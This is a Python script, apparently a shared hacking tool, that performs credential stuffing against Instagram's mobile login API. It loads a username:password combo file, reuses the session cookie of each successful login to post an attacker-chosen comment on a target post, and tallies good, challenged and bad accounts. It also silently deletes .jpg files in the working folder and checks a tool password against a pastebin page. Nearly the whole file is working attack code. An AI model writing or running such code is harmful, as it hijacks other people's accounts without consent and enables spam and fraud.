
try:
	import  sys, os, random, time, user_agent,secrets,requests,json,uuid,wget,user_agent
except:pass

try:
	import uuid
	import user_agent
	import wget
	import requests
	from secrets import token_hex
	from uuid import uuid4
	from user_agent import generate_user_agent
	from bs4 import BeautifulSoup 
except ImportError as Sidraelezz:
	os.system('pip3 install requests')
	os.system('pip3 install bs4')
	os.system("pip3 install user_agent")
	os.system("pip3 install wget")
else:pass
for Ncracked in os.listdir():
	if '.jpg' in Ncracked:
		try:os.remove(Ncracked)
		except:pass
	else:pass    

A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
M = "\033[1;96m"
Q = "("
W = ")"
s=requests.Session()

Sidra= f"""""" 
Tik = f""""""
Tk= f"""""" 
os.system('clear')

def Top(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 700)
		
re = requests.get("https://pastebin.com/raw/pkDVpCZa")
print (Sidra)
password = input('          \033[1;93mTOOL PASSWORD: '+C)
print (E)
if password == "" :
  sys.exit()
if password in str(re.text):
  print(H+" FIRST STEP Is Done. Logged in Successfully as ")
else:
  print (" Wrong Password ⌯")
  sys.exit()
print(Sidra)
token = input(A+"("+E+"⌯"+A+")"+H+ " Add Coment :\n"+C)
ID = input(A+"("+E+"⌯"+A+")"+H+ " Add ID Post :\n"+C)
def Cod_SidraELEzz():
	global ID, token 
	ok = 0
	cp = 0
	sk = 0
	print(Tik)
	SidraELEzz='7'
	if SidraELEzz=="7":
		import time
		try:
			print(Tk)
			fil= input(A+" ("+E+"⌯"+A+")"+H+ " Enter the file Combo :"+C)
		except:
			print("\n Error !!!!!!!!!")
			os.sys.exit()
		file=open(fil,"r").read().splitlines()
		for line in file:
			user=line.split(':')[0]
			pw=line.split(':')[1]
			timee = time.asctime()
			SidraaELEzz =user_agent.generate_user_agent()
			url = 'https://i.instagram.com/api/v1/accounts/login/'
			headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
			uid = str(uuid4())
			data = {'uuid':uid, 
             'password':pw, 
             'username':user, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
			Response_Sidra = requests.post(url,headers=headers,data=data,allow_redirects=True,verify=True)
			if str("logged_in_user") in Response_Sidra.text:
				ok+=1
				Cod_Sidra = Response_Sidra.cookies['sessionid']
				Sidra_hadres = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'content-length': '0',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+str(Cod_Sidra),
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/_papulakam__0/follow/',
                'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': str(SidraaELEzz),
                'x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq',
                'x-instagram-ajax': '753ce878cd6d',
                'x-requested-with': 'XMLHttpRequest'}
				Sidra_data = {'__a': '1'}
				
				Sidra_hadres3 = {

                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'content-length': '44',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid=' +str(Cod_Sidra),
                'origin': 'https://www.instagram.com',
                'referer': f'https://www.instagram.com/p/CUNdz7EoQC0/',
                'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': str(SidraaELEzz),'x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq',
                'x-instagram-ajax': '753ce878cd6d',
                'x-requested-with': 'XMLHttpRequest'}
				urCOm = f'https://www.instagram.com/web/comments/{ID}/add/'
				try:
					tx=token
					daCOM = {'comment_text': tx,'replied_to_comment_id': ''}
					requests.post(urCOm, headers=Sidra_hadres, data=daCOM)   
				except:pass
				
			elif str('"message":"challenge_required","challenge"') in Response_Sidra.text:
				cp+=1
			else:
				sk+=1
				print(Tk)
				print(A+"("+E+user+A+")"+H+" : "+A+"("+E+pw+A+")")
				print("{}┌────────────────────────┐ ".format(B))
				print(" {}({}-{}){}  Good  Comment {} : {}{}".format(A,E,A,E,A,E,str(ok)))
				print(" {}({}-{}){}  Secur Account {} : {}{}".format(A,K,A,K,A,K,str(cp)))
				print(" {}({}-{}){}  Bad Account {} : {}{}".format(A,H,A,B,A,H,str(sk)))
				print("{}└────────────────────────┘ ".format(B))
				
				

Cod_SidraELEzz()


 
